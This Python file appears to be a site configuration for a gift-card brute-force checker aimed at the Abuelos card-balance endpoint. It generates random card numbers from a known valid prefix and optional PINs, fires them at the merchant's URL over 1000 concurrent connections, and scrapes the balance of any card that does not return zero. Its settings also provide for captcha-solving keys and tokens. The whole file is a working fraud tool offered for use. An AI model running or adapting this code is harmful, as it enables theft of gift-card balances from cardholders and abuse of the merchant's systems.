# coding: utf8

#======================= IMPORT AREA =======================
#here's where you import any module needed for the website
from random import randint
#===========================================================

#====================== SETTINGS AREA ======================
#here's where you declare the settings of the website such
#as method, error key, success key, custom settings, etc...
name = "Abuelos (Old)" #Name to show when loaded
method = 'POST' #Method is either GET, POST or CUSTOM
pattern = "126450000" #Static Pattern/valid giftcard
#Setting the pattern to None will prompt the user to input theirs
pin = False #Does the config has pin? True/False
cookie = False #Does the config require Cookie Session? Trye/False
# Cookie implemntation is still in it's experimental stages
# and thus is for Advanced users only
token = False #Does the config require token? True/False
#Setting token to True will require a token_scrapper() and token_request() def
captcha = False #Does the congif require captcha support? True/False
captcha_key = None #Your captcha API key
#Setting captcha_key to None will prompt the user to enter theirs
site_key = "" #The website captcha key (see docs for help)
error = ['{cardBalance:"0.00"}']
success = None #same format as error, None means it'll accept anything that isn't an error



retries = 0 #Max retries limit
timeout = 8 #Max timeout limit in seconds
headers = None #Custom headers, None will use default
connections = 1000 #Number of connections

#===========================================================

#====================== DEFINITON AREA =====================
#here's where the definitions are made.
#There's 4 defs:
#async def cardcode(): which gives the cardcode generating algorithm
#async def pincode(): which gives the pincode generating algorithm
#def request(): Which returns the url
#async def scrapper(): This is used to scrap the value of the giftcards
#                Leave it empty to save valid giftcards without their value
#def settings(): returns the data to send in the GET request


#====== GENERATING AREA ======
async def cardcode(cardcode = pattern): #Code that generates the code
        for x in range(5): #length of the rest of the cardcode to be generated (here it's 3)
            #if pattern is set to None set range to 5
            cardcode += str(randint(0,9))
        return cardcode

async def pincode(pincode = ""):  #pattern if there's one, else put ""
        for x in range(4): #length of the pin to be generated (here it's 4)
            pincode += str(randint(0,9))
        return pincode

#====== SETTINGS AREA ======
def request(): #URL to send the requests to
        url = "http://abuelos.alohaenterprise.com:8080/abuelos/abuelos_card_balance_get.jsp"
        return url

async def scrapper(response): #Code that fetches the value/balance of the card
        value = "$" + response[:-6][response.find("cardBalance") + 13:]
        return (value)

def settings(cardcode, pincode, captcha, token): #Data to send at each request
        data = {'cardNumber':cardcode} #JSON data to send
        return (data)

#===========================================================
